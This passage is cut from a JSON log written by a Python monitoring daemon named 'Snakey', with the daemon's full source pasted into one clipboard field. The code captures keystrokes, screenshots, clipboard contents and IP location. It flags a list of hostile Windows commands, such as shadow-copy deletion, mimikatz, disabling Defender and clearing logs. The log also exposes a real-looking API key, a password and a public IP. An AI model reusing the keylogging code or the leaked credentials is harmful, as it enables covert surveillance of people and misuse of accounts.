import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "86dc640ab69e27f80283816c14c3cffc18a1247e9232f2adeb70c6d530504d30", "screenshot_hash": "4e1678f1208afd753366b27a3c8ef8f12bb8d73a55866a6f2bd536c31dbbd2b9", "_raw_log_hash": "573ccca6ec16de786e7b4e811c77e1735360ff9965a5ee99255117a4b7c53c3d"}
{"timestamp": "2025-06-10T17:49:00.833428", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime, timedelta\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\nimport shutil\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\n# json_log_path = os.path.join(base_path, \"snakey_log.json\") # NO LONGER USED FOR MAIN LOGS\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\" # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"] # Example: only trust Spain access\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === Sensitive Command Detection Configuration ===\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\",                # Formatting drives\r\n    \"del /s /q\",                # Force delete (subdirectories, quiet)\r\n    \"rmdir /s /q\",              # Force remove directory (subdirectories, quiet)\r\n    \"net user\",                 # User management (info or creation)\r\n    \"net localgroup administrators\", # Admin group checks\r\n    \"taskkill /f /im\",          # Force kill process by image name\r\n    \"schtasks /create\",         # Create scheduled tasks (persistence)\r\n    \"reg delete\",               # Delete registry keys\r\n    \"mimikatz\",                 # Credential dumping tool\r\n    \"certutil -urlcache -f -split\", # Common technique for downloading files\r\n    \"wmic shadowcopy delete\",   # Delete volume shadow copies (often pre-ransomware)\r\n    \"vssadmin delete shadows\",  # Delete volume shadow copies\r\n    \"powershell -nop -w hidden -c\", # Common PowerShell obfuscation for execution\r\n    \"invoke-expression\",        # PowerShell alias for 'iex' - executes strings as commands\r\n    \"set-mppreference -disablerealtimemonitoring $true\", # Disable Windows Defender\r\n    \"bcdedit /set {current} safeboot network\", # Set network safe mode (persistence/bypass)\r\n    \"mshta.exe http\",           # HTML Application (often for remote code execution)\r\n    \"bitsadmin /transfer\",      # Download files via BITS\r\n    \"wevtutil cl system\",       # Clear event logs\r\n    \"cipher /w\",                # Overwrite free space (anti-forensics)\r\n    \"sdelete -z\",               # Secure delete tool\r\n]\r\n\r\n# === Logging Function ===\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip()) # Also print to console for immediate feedback\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip()) # Still print even if file write fails\r\n\r\n# === Encryption Key Loading ===\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    log_daemon_message(\"INFO\", \"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD), verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    response.raw.read(1) # Read a byte to force connection establishment\r\n    response.close() # Close the connection\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\", f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,\r\n            ssl_show_warn=False,\r\n            request_timeout=30\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            log_daemon_message(\"INFO\", \"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            log_daemon_message(\"ERROR\", \"Elasticsearch client initialized but failed to ping the cluster.\")\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during Elasticsearch client initialization: {e}\")\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        log_daemon_message(\"ERROR\", f\"File not found for hashing: {filepath}\")\r\n        return None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1]) # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        # VirusTotal expects a URL to be URL-safe base64 encoded for API v3 lookup,\r\n        # but the original code uses SHA256. Sticking to SHA256 for now,\r\n        # but be aware this might not be the correct VT v3 URL ID format.\r\n        # For correct VT v3 URL lookup, you'd typically need to base64 encode the URL.\r\n        # Example: base64.urlsafe_b64encode(url.encode()).decode().strip(\"=\")\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT URL lookup: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        if not os.path.exists(file_path):\r\n            log_daemon_message(\"ERROR\", f\"File not found for VT lookup: {file_path}\")\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash: # If hashing failed\r\n            return {}\r\n\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n             log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT File lookup: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            # Ensure timestamp is ISO format for Elasticsearch\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty before sending for Kibana visualization\r\n            # If an empty list goes, Kibana's 'is not empty' filter might not work as expected\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = [] # Ensure it's an empty list if no alerts\r\n\r\n            log_daemon_message(\"DEBUG\", f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n    else:\r\n        log_daemon_message(\"WARNING\", \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\n# === New: Analyze Clipboard for Sensitive Commands ===\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content, alerts_list):\r\n    \"\"\"\r\n    Analyzes clipboard content for predefined sensitive command patterns.\r\n    Adds alerts to the alerts_list if matches are found.\r\n    \"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            # Continue to find all matches in the clipboard, do not break\r\n\r\n    return alerts_list\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session():\r\n    current_time = datetime.now() # Use this for consistent timestamping\r\n    session_log = {\r\n        \"timestamp\": current_time.isoformat(), # Use consistent timestamp\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [], # This list will be populated\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError: # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n            # NEW: Analyze clipboard for sensitive commands\r\n            analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_path = os.path.join(base_path, screenshot_information) # Define path here\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path) # Hash of screenshot image file\r\n\r\n            # VirusTotal Scan for screenshot\r\n            vt_result = vt_lookup_file(screenshot_path)\r\n            if vt_result:\r\n                session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                if vt_result.get(\"malicious\", 0) > 0:\r\n                    session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n            else:\r\n                log_daemon_message(\"INFO\", \"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n        finally:\r\n            # Clean up the temporary screenshot file\r\n            if os.path.exists(screenshot_path):\r\n                try:\r\n                    os.remove(screenshot_path)\r\n                    log_daemon_message(\"DEBUG\", f\"Removed temporary screenshot file: {screenshot_path}\")\r\n                except Exception as e:\r\n                    log_daemon_message(\"ERROR\", f\"Failed to remove temporary screenshot file: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    # Ensure clipboard is a string before checking .startswith()\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n        else:\r\n            log_daemon_message(\"INFO\", \"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger\r\n    keys = []\r\n    def on_press(key):\r\n        nonlocal keys # Ensure we modify the 'keys' list from outer scope\r\n        try:\r\n            if hasattr(key, 'char') and key.char is not None:\r\n                keys.append(key.char)\r\n            elif key == Key.space:\r\n                keys.append(' ')\r\n            elif key == Key.enter:\r\n                keys.append('[ENTER]')\r\n            elif key == Key.backspace:\r\n                keys.append('[BACKSPACE]')\r\n            elif key == Key.tab:\r\n                keys.append('[TAB]')\r\n            else:\r\n                keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Error in on_press keylogger: {e}\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running for 10 seconds. Create 'stop_snakey.txt' to terminate earlier.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10: # Collect keystrokes for 10 seconds\r\n                time.sleep(0.5) # Sleep for shorter intervals to check stop file more often\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n            log_daemon_message(\"INFO\", \"Keylogger session completed.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Keylogger listener error: {e}. This might happen if not running in a desktop session or permissions issue.\")\r\n        if listener: # Attempt to stop listener cleanly even on error\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Before proceeding, ensure alerts list is not None (shouldn't be, but as a safeguard)\r\n    if session_log[\"alerts\"] is None:\r\n        session_log[\"alerts\"] = []\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    # 1. Prepare the full log for encryption\r\n    # We will hash the raw JSON string content of the log *before* encryption\r\n    # This hash acts as an internal integrity check within the log itself\r\n    log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash) # Store hash of raw log inside\r\n\r\n    # 2. Encrypt the entire session log\r\n    try:\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n        \r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file\r\n        with open(full_encrypted_filepath, \"wb\") as f_enc:\r\n            f_enc.write(encrypted_log_data)\r\n        log_daemon_message(\"SUCCESS\", f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            log_daemon_message(\"ERROR\", \"Failed to hash encrypted log file. Ledger will not be updated with this log.\")\r\n            return session_log # Exit without updating ledger for this log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\") as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed\r\n                    if ledger and isinstance(ledger[0], str): # Check if old format (list of hashes)\r\n                        log_daemon_message(\"INFO\", \"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": current_time.isoformat(), # Cannot determine true timestamp for old entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        log_daemon_message(\"SUCCESS\", \"Legacy hash ledger converted.\")\r\n                except json.JSONDecodeError:\r\n                    log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                    ledger = []\r\n            else:\r\n                ledger = []\r\n\r\n            previous_encrypted_file_hash = ledger[-1][\"encrypted_file_hash\"] if ledger else \"0\" * 64\r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath # Store the path to the encrypted log\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            with open(hash_ledger_path, \"w\") as f:\r\n                json.dump(ledger, f, indent=4)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            with open(merkle_root_path, \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Merkle root saved (based on encrypted file hashes).\")\r\n\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"Encryption or encrypted file save error: {e}\")\r\n\r\n    # Return the session_log for Elasticsearch and Wazuh (containing clear-text data for these)\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        log_daemon_message(\"INFO\", \"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove existing stop file: {e}\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session() # This now handles saving encrypted logs and updating ledger\r\n\r\n        # Send the (original, unencrypted) session_log to Wazuh and Elasticsearch\r\n        # These systems need the clear-text data for analysis and display\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(15)\r\n\r\n    # Final cleanup of stop file\r\n    if os.path.exists(stop_file_path):\r\n        try:\r\n            os.remove(stop_file_path)\r\n            log_daemon_message(\"INFO\", \"Stop file removed on graceful exit.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove stop file during exit: {e}\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del 